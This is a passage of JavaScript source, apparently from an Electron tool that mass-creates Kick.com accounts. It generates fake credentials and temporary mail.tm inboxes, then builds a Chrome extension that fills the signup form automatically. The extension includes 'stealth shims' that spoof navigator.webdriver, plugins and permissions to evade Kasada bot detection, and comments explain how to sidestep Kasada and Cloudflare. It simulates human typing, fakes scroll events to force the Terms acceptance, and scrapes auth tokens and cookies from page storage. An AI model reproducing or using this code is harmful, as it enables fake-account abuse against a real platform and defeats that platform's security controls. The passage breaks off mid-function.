  await userInput.waitFor({ state: 'visible', timeout: 6000 });
  await userInput.click({ delay: 80 });
  await userInput.fill('');
  await userInput.type(creds.kickUsername, { delay: 70 });
  await page.waitForTimeout(300 + Math.random() * 250);

  // Password
  kacEmit('kick-creator-progress', { step: 'fill', msg: 'Typing password…' });
  const passInput = page.locator('input[type="password"]').first();
  await passInput.waitFor({ state: 'visible', timeout: 6000 });
  await passInput.click({ delay: 80 });
  await passInput.fill('');
  await passInput.type(creds.password, { delay: 70 });
  await page.waitForTimeout(450 + Math.random() * 300);

  // Submit — anchor to the form that owns the password input
  kacEmit('kick-creator-progress', { step: 'submit', msg: 'Clicking Sign Up…' });
  let submitBtn = passInput.locator('xpath=ancestor::form').locator('button[type="submit"]').first();
  if (!(await submitBtn.count())) {
    submitBtn = page.locator('form button[type="submit"]').first();
  }
  if (!(await submitBtn.count())) {
    submitBtn = page.locator('form').locator('button', { hasText: /^\s*Sign\s*Up\s*$/i }).first();
  }
  if (!(await submitBtn.count())) {
    await passInput.press('Enter');
    return passInput;
  }
  await submitBtn.waitFor({ state: 'visible', timeout: 5000 });
  await submitBtn.click({ timeout: 8000 });
  return passInput;
}

// ── Code injector (single-input or N OTP cells) ──────────────────────────────
async function kacInjectCodeOnPage(page, code) {
  return await page.evaluate((digits) => {
    function setNative(el, value) {
      const desc = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, 'value');
      desc && desc.set && desc.set.call(el, value);
    }
    function fire(el, types) {
      for (const t of types) el.dispatchEvent(new Event(t, { bubbles: true }));
    }
    // Single input
    const single = Array.from(document.querySelectorAll('input')).find(i =>
      (i.maxLength && i.maxLength === digits.length) ||
      /code|verif|otp/i.test((i.name||'') + (i.id||'') + (i.placeholder||''))
    );
    if (single) {
      single.focus(); setNative(single, '');
      for (const ch of digits) {
        setNative(single, single.value + ch);
        single.dispatchEvent(new InputEvent('input', { bubbles: true, data: ch, inputType: 'insertText' }));
      }
      fire(single, ['change','blur']);
      return true;
    }
    // OTP cells
    const cells = Array.from(document.querySelectorAll('input'))
      .filter(i => i.maxLength === 1 && /^(text|tel|number)$/i.test(i.type));
    if (cells.length >= digits.length) {
      for (let i = 0; i < digits.length; i++) {
        const el = cells[i];
        el.focus(); setNative(el, digits[i]);
        el.dispatchEvent(new InputEvent('input', { bubbles: true, data: digits[i], inputType: 'insertText' }));
        fire(el, ['change']);
      }
      return true;
    }
    return false;
  }, String(code));
}

// ── Background mail.tm poller — runs after Chrome opens, stores the code on
//    the pending session so the local HTTP server can serve it to the
//    in-page extension. `mailbox.token` is the Bearer for /messages.
async function kacBackgroundCodePoll(sessionId, mailbox, timeoutMs = 300000) {
  const mailToken = mailbox && mailbox.token;
  if (!mailToken) {
    kacEmit('kick-creator-progress', {
      step: 'warn', type: 'warn', sessionId,
      msg:  'Background poller: no mail.tm token',
    });
    return;
  }
  const t0 = Date.now();
  const seen = new Set();
  while (Date.now() - t0 < timeoutMs) {
    if (KAC.abort || !KAC_PENDING.has(sessionId)) return;
    let messages = [];
    try { messages = await kacMailListMessages(mailToken); } catch (_) {}
    for (const m of messages) {
      if (seen.has(m.id)) continue;
      seen.add(m.id);
      let full = null;
      try { full = await kacMailGetMessage(mailToken, m.id); } catch (_) {}
      const code = kacExtractCode(full || m);
      if (code) {
        const p = KAC_PENDING.get(sessionId);
        if (p) p.code = code;
        kacEmit('kick-creator-progress', {
          step: 'code', type: 'ok',
          sessionId, code,
          msg:  `Verification code arrived: ${code}  (also pushed to extension)`,
        });
        try { require('electron').clipboard.writeText(code); } catch (_) {}
        return;
      }
    }
    await kacSleep(3000);
  }
  kacEmit('kick-creator-progress', {
    step: 'warn', type: 'warn', sessionId,
    msg:  'No verification email received within 5 minutes',
  });
}

// ── Single account-creation pipeline (real-browser assisted mode) ────────────
//
//   1. Generate random credentials + temp mailbox
//   2. Spawn a CLEAN real Chrome to kick.com — no Playwright, no CDP,
//      no automation flags. Just plain `chrome.exe https://kick.com/`.
//      Kasada cannot detect what isn't there.
//   3. Emit credentials to the renderer (the UI shows copy buttons + steps)
//   4. Background-poll mail.tm; when the verification code arrives, push it
//      to the renderer and auto-copy to clipboard.
//   5. The user manually completes signup in the real Chrome window.
//   6. When done, the user pastes their Kick auth token into FLT
//      → `kick-creator-save-token` IPC validates + saves it as an account.
//
//   This sidesteps Kasada/Cloudflare entirely because the only thing
//   touching kick.com is a real human in a real, untouched browser.
// Sentinel — runner sees this and gets fresh creds for the next attempt.
class KacSkipError extends Error {
  constructor(reason) { super(reason); this.name = 'KacSkipError'; this.skip = true; }
}

// ── Extract token from a BrowserWindow (kick.com session) ────────────────────
async function kacExtractTokenFromBrowserWindow(win) {
  try {
    const cookies = await win.webContents.session.cookies.get({ domain: '.kick.com' });
    let bearerToken = null;
    try {
      bearerToken = await win.webContents.executeJavaScript(`
        (function(){
          var keys=['auth._token.local','auth._token.laravelPassport','auth._token.kick','token','auth_token','access_token'];
          for(var i=0;i<keys.length;i++){var v=localStorage.getItem(keys[i]);if(v&&v.length>10)return v.replace(/^Bearer\\s+/i,'');}
          for(var k of Object.keys(localStorage)){var v=localStorage.getItem(k);if(v&&v.length>20&&v.length<800&&(k.toLowerCase().includes('token')||k.toLowerCase().includes('auth')))return v.replace(/^Bearer\\s+/i,'');}
          return null;
        })()
      `);
    } catch (_) {}
    return {
      bearerToken,
      cookies: cookies.map((c) => ({ name: c.name, value: c.value })),
    };
  } catch {
    return { bearerToken: null, cookies: [] };
  }
}

// ── Real-browser ASSISTED pipeline — NO Playwright, NO CDP, NO automation. ───
//
// Why: Kasada flags any session the moment CDP traffic touches it (you saw
// the `Request blocked by security policy` 403 with a session reference).
// The ONLY way to beat it is to give Kasada literally nothing to detect —
// real Chrome, real user input, real keyboard events.
//
// This pipeline:
//   1. Generates a random mailbox + creds
//   2. Spawns a CLEAN Chrome (only --user-data-dir, --new-window — nothing else)
//   3. Pushes creds + a session id to the renderer so the UI shows copy buttons
//   4. Polls mail.tm in the background and pushes the verification code
//   5. Waits for the renderer to call kick-creator-save-token (user pastes
//      the auth token after signing up) OR kick-creator-skip-session
//      (auto-fired if Kick shows "Unknown error" in chrome).
// ── Real-browser ASSISTED pipeline — no Playwright, no CDP, no automation. ──
// You handle the form yourself in a clean Chrome window. FLT handles every-
// thing AROUND it: random creds, temp mailbox, code polling, token save.
// If Kick shows any error/captcha, just solve it yourself in the open window.
// ── Chrome extension generator — handles the FULL 7-step signup flow:
//    1. Click header Sign Up                → open auth modal
//    2. Switch to Sign Up tab if needed
//    3. Fill email · birthday · username · password
//    4. Click the green Sign Up (form submit)
//    5. Poll FLT's local server for the verification code, then type it
//    6. Wait for Terms modal → scroll the content to the bottom
//    7. Click "I accept" → extract auth token → POST back to FLT
function kacBuildExtension(rootDir, creds, sessionId, serverOrigin) {
  fs.mkdirSync(rootDir, { recursive: true });

  // manifest.json — Manifest V3
  //   • `cookies` perm lets background.js wipe Kick auth cookies before signup
  //     and so the profile starts logged-out
  //   • `tabs` perm lets background.js navigate the tab after sign-out
  const manifest = {
    manifest_version: 3,
    name:    'FLT Kick Helper',
    version: '1.0',
    description: 'Account setup helper',
    permissions: ['storage', 'cookies', 'tabs', 'scripting'],
    host_permissions: [
      'https://kick.com/*',
      'https://*.kick.com/*',
      'http://127.0.0.1/*',
      'http://localhost/*',
    ],
    background: { service_worker: 'background.js' },
    content_scripts: [{
      matches: ['https://kick.com/*'],
      js: ['content.js'],
      run_at: 'document_start',
      world: 'MAIN',
    }],
  };
  fs.writeFileSync(path.join(rootDir, 'manifest.json'), JSON.stringify(manifest, null, 2));

  // background.js — minimal service worker. The user-data-dir is fresh on every
  // run, so there's nothing to clean up. Just pings FLT so it knows the
  // extension actually loaded.
  const backgroundJs =
`const FLT_SESSION = ${JSON.stringify(sessionId)};
const FLT_SERVER  = ${JSON.stringify(serverOrigin)};

function report(status) {
  fetch(FLT_SERVER + '/status', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ session: FLT_SESSION, status, url: 'bg' }),
  }).catch(() => {});
}

(async () => {
  report('bg-starting');
  // Force the active tab onto kick.com (it might be on the profile home page)
  try {
    const tabs = await chrome.tabs.query({});
    const target = 'https://kick.com/';
    if (tabs.length > 0 && !/^https?:\\/\\/(www\\.)?kick\\.com/.test(tabs[0].url || '')) {
      await chrome.tabs.update(tabs[0].id, { url: target, active: true });
    }
  } catch (_) {}
})();
`;
  fs.writeFileSync(path.join(rootDir, 'background.js'), backgroundJs);

  // content.js — full 7-step signup flow
  const contentJs =
`// FLT Kick auto-signup — handles the whole 7-step flow.
(function() {
  if (window.__FLT_KAC_ACTIVE) return;
  window.__FLT_KAC_ACTIVE = true;

  // ── STEALTH SHIMS — patch the obvious automation tells BEFORE Kasada's JS
  //    challenge runs. The extension content-script is the earliest possible
  //    moment we can do this, so the page sees a "normal user" fingerprint.
  try {
    Object.defineProperty(navigator, 'webdriver', { get: () => false, configurable: true });
  } catch (_) {}
  try {
    // Empty plugins/mimeTypes is a tell — restore typical desktop Chrome values
    if (!navigator.plugins || navigator.plugins.length === 0) {
      Object.defineProperty(navigator, 'plugins', {
        get: () => [
          { name: 'PDF Viewer', filename: 'internal-pdf-viewer', description: '' },
          { name: 'Chrome PDF Viewer', filename: 'internal-pdf-viewer', description: '' },
          { name: 'Chromium PDF Viewer', filename: 'internal-pdf-viewer', description: '' },
        ],
        configurable: true,
      });
    }
    if (!navigator.languages || navigator.languages.length < 2) {
      Object.defineProperty(navigator, 'languages', { get: () => ['en-US', 'en'], configurable: true });
    }
  } catch (_) {}
  try {
    // chrome.runtime is normally present in real Chrome but missing in headless
    if (!window.chrome) window.chrome = { runtime: {} };
    else if (!window.chrome.runtime) window.chrome.runtime = {};
  } catch (_) {}
  try {
    // Patch the canvas-fingerprint Permissions query (a common Kasada probe)
    const origQuery = navigator.permissions && navigator.permissions.query;
    if (origQuery) {
      navigator.permissions.query = (p) =>
        p && p.name === 'notifications'
          ? Promise.resolve({ state: Notification.permission, onchange: null })
          : origQuery.call(navigator.permissions, p);
    }
  } catch (_) {}

  const CREDS   = ${JSON.stringify(creds)};
  const SESSION = ${JSON.stringify(sessionId)};
  const SERVER  = ${JSON.stringify(serverOrigin)};

  // ── IMMEDIATE heartbeat — fires the moment the script loads.  ─────────────
  //    If FLT doesn't see this within 10 seconds, the extension didn't load
  //    and we know to fix the launcher, not the flow.
  try {
    document.title = '[FLT:loaded] ' + document.title;
  } catch (_) {}
  fetch(SERVER + '/status', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ session: SESSION, status: 'loaded', url: location.href }),
  }).catch(() => {});

  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const rand  = (lo, hi) => lo + Math.random() * (hi - lo);

  function visible(el) {
    if (!el) return false;
    const r = el.getBoundingClientRect();
    if (!r.width || !r.height) return false;
    const cs = getComputedStyle(el);
    return cs.display !== 'none' && cs.visibility !== 'hidden' && cs.opacity !== '0';
  }
  function setNative(el, value) {
    const proto = el.tagName === 'TEXTAREA' ? HTMLTextAreaElement.prototype : HTMLInputElement.prototype;
    const desc = Object.getOwnPropertyDescriptor(proto, 'value');
    desc.set.call(el, value);
  }
  function fire(el, types) { for (const t of types) el.dispatchEvent(new Event(t, { bubbles: true })); }
  function _humanClick(el) {
    if (!el) return;
    try {
      const r = el.getBoundingClientRect();
      const x = r.left + r.width  / 2;
      const y = r.top  + r.height / 2;
      el.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, button: 0 }));
      el.dispatchEvent(new MouseEvent('mouseup',   { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, button: 0 }));
      el.dispatchEvent(new MouseEvent('click',     { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, button: 0 }));
    } catch (_) {}
    try { el.click(); } catch (_) {}
  }
  async function humanType(el, text) {
    // Real humans:
    //   1. click into the field FIRST
    //   2. take a moment before starting to type
    //   3. type with variable speed and occasional micro-pauses
    //   4. blur the field when done (e.g., clicking next field)
    _humanClick(el);
    await sleep(rand(180, 420));                // "now I think about what to type"
    el.focus();
    setNative(el, '');
    fire(el, ['input']);
    for (let i = 0; i < text.length; i++) {
      const ch = text[i];
      setNative(el, el.value + ch);
      el.dispatchEvent(new InputEvent('input',   { bubbles: true, data: ch, inputType: 'insertText' }));
      el.dispatchEvent(new KeyboardEvent('keydown', { bubbles: true, key: ch }));
      el.dispatchEvent(new KeyboardEvent('keyup',   { bubbles: true, key: ch }));
      // Per-keystroke pause — most ~80–160 ms, but ~12% chance of a longer
      // thinking pause that mimics natural typing rhythm.
      const slowKey = Math.random() < 0.12;
      await sleep(slowKey ? rand(280, 540) : rand(75, 165));
    }
    fire(el, ['change','blur']);
    el.blur && el.blur();
    await sleep(rand(220, 480));                // "now I move to the next field"
  }
  function findVisible(selectors, predicate) {
    const list = Array.from(document.querySelectorAll(selectors));
    return list.filter(visible).find(predicate || (() => true));
  }
  async function waitFor(fn, timeoutMs, pollMs) {
    const t0 = Date.now();
    while (Date.now() - t0 < timeoutMs) {
      const v = fn();
      if (v) return v;
      await sleep(pollMs || 250);
    }
    return null;
  }

  function report(status) {
    fetch(SERVER + '/status', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ session: SESSION, status, url: location.href }),
    }).catch(() => {});
    try { document.title = '[FLT:' + status + '] ' + document.title.replace(/^\\[FLT:[^\\]]+\\] /, ''); } catch (_) {}
    console.log('[FLT]', status);
  }

  // ── STEP 1: open Sign Up modal ─────────────────────────────────────────────
  async function step1_openModal() {
    const btn = await waitFor(() => {
      const candidates = Array.from(document.querySelectorAll('button, a, [role="button"]'))
        .filter(visible);
      return candidates.find(el =>
        /^\\s*sign\\s*up\\s*$/i.test((el.textContent || '').trim().replace(/\\s+/g, ' '))
      );
    }, 20000, 400);
    if (!btn) return false;
    // Real-user hesitation: read the page for a moment, hover, then click
    await sleep(rand(900, 1800));
    _humanClick(btn);
    return true;
  }

  // ── STEP 2: ensure Sign Up tab (not Log In) is active ──────────────────────
  async function step2_ensureSignUpTab() {
    await sleep(rand(900, 1600));   // wait for modal to fully render
    const tab = findVisible('[role="tab"], button',
      el => /^\\s*sign\\s*up\\s*$/i.test((el.textContent||'').trim())
            && el.getAttribute('type') !== 'submit');
    if (tab && !/active/i.test(tab.className || '')) {
      _humanClick(tab);
      await sleep(rand(600, 1100));
    }
  }

  // ── STEP 3: fill the form ──────────────────────────────────────────────────
  async function step3_fillForm() {
    const emailEl = await waitFor(
      () => findVisible('input[type="email"], input[name*="email" i], input[placeholder*="email" i]'),
      15000, 250);
    if (!emailEl) return false;
    await humanType(emailEl, CREDS.email);
    await sleep(rand(200, 400));

    const dateEl = findVisible('input[type="date"], input[name*="birth" i], input[placeholder*="MM" i]');
    if (dateEl) {
      if (dateEl.type === 'date') {
        setNative(dateEl, CREDS.birthdayIso);
        fire(dateEl, ['input','change','blur']);
      } else {
        await humanType(dateEl, CREDS.birthdayUsa);
      }
      await sleep(rand(200, 400));
    }

    // Username — try each candidate, retry on "already taken" error
    const userEl = findVisible('input[name*="user" i], input[placeholder*="user" i], input[id*="user" i]');
    if (userEl) {
      const pool = (CREDS.usernamePool && CREDS.usernamePool.length)
        ? CREDS.usernamePool
        : [CREDS.kickUsername];

      // Check if Kick's inline validation flagged the username as taken.
      function isUsernameError() {
        if (userEl.getAttribute('aria-invalid') === 'true') return true;
        // Walk up to 5 ancestors and look for telling error text near THIS input
        let scope = userEl.parentElement;
        for (let i = 0; i < 5 && scope; i++, scope = scope.parentElement) {
          const t = (scope.textContent || '').toLowerCase();
          // Avoid false positives from the password-strength text
          if (/(password|email)/i.test(t.slice(0, 240))) continue;
          if (/already\\s*(been\\s*)?taken|unavailable|not\\s*available|already\\s+in\\s+use|already\\s+exists/i.test(t)) {
            return true;
          }
        }
        return false;
      }

      let chosen = null;
      for (let i = 0; i < pool.length; i++) {
        const candidate = pool[i];
        await humanType(userEl, candidate);
        userEl.blur && userEl.blur();
        await sleep(1400);  // let Kick run async validation

        if (!isUsernameError()) {
          chosen = candidate;
          report('username-ok-' + candidate);
          break;
        }
        report('username-taken-' + candidate);

        // Clear the field for the next attempt
        userEl.focus();
        setNative(userEl, '');
        userEl.dispatchEvent(new InputEvent('input', { bubbles: true, data: '', inputType: 'deleteContentBackward' }));
        fire(userEl, ['change']);
        await sleep(400);
      }
      if (!chosen) chosen = pool[pool.length - 1];

      // Tell FLT which name we settled on, so the saved account record uses it
      fetch(SERVER + '/username', {
        method: 'POST',
        headers: { 'content-type': 'application/json' },
        body: JSON.stringify({ session: SESSION, username: chosen }),
      }).catch(() => {});
      CREDS.kickUsername = chosen;
      await sleep(rand(200, 400));
    }

    const passEl = findVisible('input[type="password"]');
    if (passEl) {
      await humanType(passEl, CREDS.password);
      await sleep(rand(300, 500));
    }
    return true;
  }

  // ── STEP 4: click the green Sign Up submit (anchored to password's form) ──
  async function step4_clickSubmit() {
    const passEl = findVisible('input[type="password"]');
    if (!passEl) return false;
    const form = passEl.closest('form');
    let btn = null;
    if (form) {
      btn = form.querySelector('button[type="submit"]');
      if (!btn) {
        btn = Array.from(form.querySelectorAll('button')).filter(visible)
          .find(b => /^\\s*sign\\s*up\\s*$/i.test((b.textContent || '').trim()));
      }
    }
    if (!btn) {
      btn = document.querySelector('form button[type="submit"]');
    }
    if (!btn) return false;
    // Real human: pause to verify the form, then deliberately click submit
    await sleep(rand(1100, 2200));
    _humanClick(btn);
    return true;
  }

  // ── STEP 5: poll FLT for the verification code, then type it ──────────────
  async function step5_typeCode() {
    let code = null;
    for (let i = 0; i < 90; i++) {  // up to 3 minutes
      try {
        const r = await fetch(SERVER + '/code?session=' + encodeURIComponent(SESSION));
        const j = await r.json();
        if (j && j.code) { code = String(j.code); break; }
      } catch (_) {}
      await sleep(2000);
    }
    if (!code) return false;
    report('code-received-' + code);

    // Wait for the code input(s) to appear
    const inputs = await waitFor(() => {
      const single = Array.from(document.querySelectorAll('input')).filter(visible).find(i =>
        (i.maxLength && i.maxLength === code.length) ||
        /code|verif|otp/i.test((i.name||'') + (i.id||'') + (i.placeholder||''))
      );
      if (single) return [single];
      const cells = Array.from(document.querySelectorAll('input'))
        .filter(visible).filter(i => i.maxLength === 1 && /^(text|tel|number)$/i.test(i.type));
      return cells.length >= code.length ? cells : null;
    }, 20000, 300);
    if (!inputs) return false;

    if (inputs.length === 1) {
      const el = inputs[0];
      el.focus();
      setNative(el, '');
      for (const ch of code) {
        setNative(el, el.value + ch);
        el.dispatchEvent(new InputEvent('input', { bubbles: true, data: ch, inputType: 'insertText' }));
        await sleep(80);
      }
      fire(el, ['change','blur']);
    } else {
      for (let i = 0; i < code.length; i++) {
        const el = inputs[i];
        el.focus();
        setNative(el, code[i]);
        el.dispatchEvent(new InputEvent('input', { bubbles: true, data: code[i], inputType: 'insertText' }));
        fire(el, ['change']);
        await sleep(80);
      }
    }
    return true;
  }

  // ── STEP 6: wait for Terms modal → scroll EVERY scrollable to bottom ──────
  async function step6_scrollTerms() {
    await sleep(1200);

    const termsHdr = await waitFor(() => {
      const headers = Array.from(document.querySelectorAll('h1,h2,h3,h4,div,span'))
        .filter(visible);
      return headers.find(h => /terms\\s*(and|&)\\s*conditions|terms\\s*of\\s*service|please\\s*accept/i.test(
        (h.textContent || '').trim()
      ));
    }, 15000, 400);
    if (!termsHdr) return false;
    report('terms-modal-open');

    // Collect ALL scrollable containers inside the modal AND globally
    function allScrollables() {
      const out = [];
      const all = Array.from(document.querySelectorAll('*'));
      for (const el of all) {
        if (!visible(el)) continue;
        const cs = getComputedStyle(el);
        const oy = cs.overflowY, ox = cs.overflow;
        if (!/auto|scroll/.test(oy) && !/auto|scroll/.test(ox)) continue;
        if (el.scrollHeight - el.clientHeight < 50) continue;
        out.push(el);
      }
      return out;
    }
    report('terms-scrolling');

    // Round 1: incrementally scroll EACH candidate to the bottom.
    //          Some sites use nested scrollers — we hit them all.
    const scrollers = allScrollables();
    for (const sc of scrollers) {
      let safety = 0;
      while (safety++ < 80 && sc.scrollTop + sc.clientHeight < sc.scrollHeight - 4) {
        sc.scrollTop = Math.min(sc.scrollTop + Math.max(120, sc.clientHeight * 0.85), sc.scrollHeight);
        sc.dispatchEvent(new Event('scroll', { bubbles: true }));
        // Fire a fake wheel event too — some "scroll-to-end" detectors look for wheel
        sc.dispatchEvent(new WheelEvent('wheel', { bubbles: true, deltaY: 200 }));
        await sleep(70);
      }
      sc.scrollTop = sc.scrollHeight;
      sc.dispatchEvent(new Event('scroll', { bubbles: true }));
      sc.dispatchEvent(new WheelEvent('wheel', { bubbles: true, deltaY: 200 }));
    }

    // Round 2: also scroll the document itself
    const docEl = document.scrollingElement || document.documentElement;
    docEl.scrollTop = docEl.scrollHeight;

    // Round 3: settle so React can react
    await sleep(900);

    // Round 4: any LATE-discovered scrollables (Kick may add more after first scroll)
    const lateScrollers = allScrollables();
    for (const sc of lateScrollers) {
      sc.scrollTop = sc.scrollHeight;
      sc.dispatchEvent(new Event('scroll', { bubbles: true }));
    }
    await sleep(400);

    return true;
  }

  // ── STEP 7: click "I accept" — robust against Tailwind \`disabled:\` classes ─
  async function step7_clickAccept() {
    // Try up to 30 seconds — Kick sometimes takes a beat to enable
    const found = await waitFor(() => {
      // Cast a wide net: button, role=button, any element with text "I accept"
      const all = Array.from(document.querySelectorAll(
        'button, [role="button"], a, div, span'
      )).filter(visible);
      const match = all.find((el) => {
        const txt = (el.textContent || '').trim().replace(/\\s+/g, ' ');
        return /^i\\s+accept$/i.test(txt) && txt.length < 40;
      });
      return match || null;
    }, 30000, 350);

    if (!found) return false;

    // If it's disabled, try scrolling more then waiting
    if (isHardDisabled(found)) {
      report('terms-button-disabled-retrying');
      // Try a final aggressive scroll on every scrollable, then wait
      const scrollers = Array.from(document.querySelectorAll('*'))
        .filter((el) => {
          if (!visible(el)) return false;
          const cs = getComputedStyle(el);
          return (/auto|scroll/.test(cs.overflowY) || /auto|scroll/.test(cs.overflow))
                 && el.scrollHeight - el.clientHeight > 50;
        });
      for (const sc of scrollers) {
        sc.scrollTop = sc.scrollHeight;
        sc.dispatchEvent(new Event('scroll', { bubbles: true }));
        sc.dispatchEvent(new WheelEvent('wheel', { bubbles: true, deltaY: 600 }));
      }
      // Also try scrolling INSIDE the button's container in case the
      // wrapper itself is the scroller
      const parent = found.closest('[class*="scroll" i], [class*="overflow" i]')
                  || found.parentElement;
      if (parent) { parent.scrollTop = parent.scrollHeight; }
      await sleep(1500);

      if (isHardDisabled(found)) {
        // Last-ditch: try clicking anyway — some "disabled" states are visual only
        report('terms-button-still-disabled-force-clicking');
      }
    }

    // Click via real MouseEvent (more reliable than .click() on weird elements)
    await sleep(300);
    realClick(found);

    // Verify the click took effect — wait briefly to see if the modal closes
    await sleep(1500);
    const still = Array.from(document.querySelectorAll('button, [role="button"], a, div, span'))
      .filter(visible)
      .find((el) => /^i\\s+accept$/i.test((el.textContent || '').trim()));
    if (still) {
      report('terms-button-click-no-effect-retrying');
      realClick(still);
      await sleep(1200);
    }
    return true;
  }

  // ── Shared helper: is an element really, truly disabled? ──────────────────
  function isHardDisabled(el) {
    if (!el) return true;
    if (el.disabled === true) return true;
    if (el.hasAttribute('disabled')) return true;
    if (el.getAttribute('aria-disabled') === 'true') return true;
    const cs = getComputedStyle(el);
    if (cs.pointerEvents === 'none') return true;
    return false;
  }

  // Click an element via a real synthetic MouseEvent + native click fallback
  function realClick(el) {
    if (!el) return false;
    try {
      const r = el.getBoundingClientRect();
      const x = r.left + r.width / 2;
      const y = r.top + r.height / 2;
      el.focus && el.focus();
      el.dispatchEvent(new MouseEvent('mousedown', { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, button: 0 }));
      el.dispatchEvent(new MouseEvent('mouseup',   { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, button: 0 }));
      el.dispatchEvent(new MouseEvent('click',     { bubbles: true, cancelable: true, view: window, clientX: x, clientY: y, button: 0 }));
    } catch (_) {}
    try { el.click(); } catch (_) {}
    return true;
  }

  // ── STEP 8: dismiss post-signup onboarding ────────────────────────────────
  //   8a. Welcome to the community  → "Get Started"  (advances to next modal)
  //   8b. Tell us a bit about you   → click X to skip onboarding entirely
  //   (We don't need to answer the questions — Kick lets you skip.)
  async function step8_onboarding() {
    await sleep(1800);

    // 8a — Welcome → Get Started
    const welcomeBtn = await waitFor(() => {
      const btns = Array.from(document.querySelectorAll('button, [role="button"]')).filter(visible);
      return btns.find(b =>
        /^get\\s*started$/i.test((b.textContent || '').trim().replace(/\\s+/g, ' ')) &&
        !isHardDisabled(b)
      );
    }, 12000, 300);
    if (welcomeBtn) {
      realClick(welcomeBtn);
      report('clicked-welcome');
      await sleep(1500);
    } else {
      report('welcome-not-found');
    }

    // 8b — Tell us about you → click the X (top-right close icon) to skip
    const xBtn = await waitFor(() => {
      // Strategy 1: button with aria-label / title containing "close" / "dismiss"
      let candidates = Array.from(document.querySelectorAll('button, [role="button"], [aria-label]')).filter(visible);
      let hit = candidates.find(b => {
        const al = (b.getAttribute('aria-label') || '').toLowerCase();
        const ti = (b.getAttribute('title') || '').toLowerCase();
        return /close|dismiss|skip/.test(al) || /close|dismiss|skip/.test(ti);
      });
      if (hit) return hit;

      // Strategy 2: text content is exactly × or ✕ (a literal X)
      hit = candidates.find(b => {
        const t = (b.textContent || '').trim();
        return t === '×' || t === '✕' || t === '✖' || t === 'x' || t === 'X';
      });
      if (hit) return hit;

      // Strategy 3: small button in upper-right of viewport containing an SVG
      hit = candidates.find(b => {
        if (!b.querySelector('svg')) return false;
        const r = b.getBoundingClientRect();
        if (r.width === 0 || r.height === 0) return false;
        if (r.width > 60 || r.height > 60) return false;     // small icon button
        if (r.top > window.innerHeight * 0.55) return false; // upper half
        if (r.right < window.innerWidth * 0.45) return false; // right-ish half
        return true;
      });
      return hit || null;
    }, 12000, 300);

    if (xBtn) {
      realClick(xBtn);
      report('clicked-x-close');
      await sleep(2000);
      return true;
    }

    // Fallback: press Escape — most modals dismiss on Esc
    report('x-not-found-trying-escape');
    document.dispatchEvent(new KeyboardEvent('keydown', {
      key: 'Escape', code: 'Escape', keyCode: 27, which: 27, bubbles: true,
    }));
    document.dispatchEvent(new KeyboardEvent('keyup', {
      key: 'Escape', code: 'Escape', keyCode: 27, which: 27, bubbles: true,
    }));
    await sleep(1500);
    return true;
  }

  // ── Token extraction — looks for Sanctum-format \`id|hex\` ──────────────────
  // Kick uses Laravel Sanctum personal-access-tokens (\`<id>|<40-char-hex>\`)
  // for their Bearer auth. We try MANY strategies because Kick has changed
  // where they store this over time.
  function isSanctumToken(s) {
    if (typeof s !== 'string') return false;
    // <numeric>|<base62 of length 40+>
    return /^\\d+\\|[A-Za-z0-9_\\-]{30,}$/.test(s);
  }

  function extractToken() {
    // STRATEGY 1: scan ALL localStorage + sessionStorage for a Sanctum-shape value
    for (const storage of [localStorage, sessionStorage]) {
      for (const k of Object.keys(storage)) {
        const v = storage.getItem(k);
        if (isSanctumToken(v)) return v;
        // Also unwrap JSON: {"value":"123|abc..."} or {"token":"..."}
        if (typeof v === 'string' && v.length < 3000 && v.startsWith('{')) {
          try {
            const j = JSON.parse(v);
            if (j && typeof j === 'object') {
              const stack = [j];
              while (stack.length) {
                const cur = stack.pop();
                for (const key of Object.keys(cur)) {
                  const cv = cur[key];
                  if (typeof cv === 'string' && isSanctumToken(cv)) return cv;
                  if (cv && typeof cv === 'object' && !Array.isArray(cv)) stack.push(cv);
                }
              }
            }
          } catch (_) {}
        }
      }
    }

    // STRATEGY 2: scan cookies for a Sanctum value
    for (const c of (document.cookie || '').split(';')) {
      const eq = c.indexOf('=');
      if (eq < 0) continue;
      const v = decodeURIComponent(c.slice(eq + 1).trim());
      if (isSanctumToken(v)) return v;
    }

    return null;
  }

  // ── Call Kick's login API to REQUEST a fresh Sanctum token ────────────────
  // After signup the user has a cookie-based session but no Sanctum token
  // yet. Calling /api/v2/login (or /mobile/login) with our just-created
  // credentials returns one in the response body.
  async function requestTokenViaLogin() {
    const xsrfMatch = (document.cookie || '').match(/(?:^|;\\s*)XSRF-TOKEN=([^;]+)/);
    const xsrf = xsrfMatch ? decodeURIComponent(xsrfMatch[1]) : '';

    // Try multiple login endpoints — Kick has moved them around
    const endpoints = [
      'https://kick.com/api/v2/login',
      'https://kick.com/mobile/login',
      'https://kick.com/api/v2/auth/login',
      'https://kick.com/api/v1/login',
    ];
    for (const url of endpoints) {
      try {
        const r = await fetch(url, {
          method: 'POST',
          credentials: 'include',
          headers: {
            'content-type': 'application/json',
            'accept':       'application/json',
            'x-xsrf-token': xsrf,
          },
          body: JSON.stringify({
            email:    CREDS.email,
            password: CREDS.password,
          }),
        });
        if (!r.ok) {
          report('login-' + url.replace(/^.*\\//, '') + '-' + r.status);
          continue;
        }
        let data = null;
        try { data = await r.json(); } catch (_) {}
        if (!data) continue;
        // Walk the response looking for a Sanctum-shape token
        const stack = [data];
        while (stack.length) {
          const cur = stack.pop();
          if (typeof cur === 'string' && isSanctumToken(cur)) return cur;
          if (cur && typeof cur === 'object') {
            for (const key of Object.keys(cur)) stack.push(cur[key]);
          }
        }
      } catch (_) {}
    }
    return null;
  }

  // Debug helper — dump every storage key (lengths only) to FLT so we can
  // see what Kick actually stores after signup.
  function dumpStorageKeys() {
    const lsKeys = Object.keys(localStorage).map(k => k + '(' + (localStorage.getItem(k) || '').length + ')');
    const ssKeys = Object.keys(sessionStorage).map(k => k + '(' + (sessionStorage.getItem(k) || '').length + ')');
    const ckKeys = (document.cookie || '').split(';').map(c => {
      const eq = c.indexOf('=');
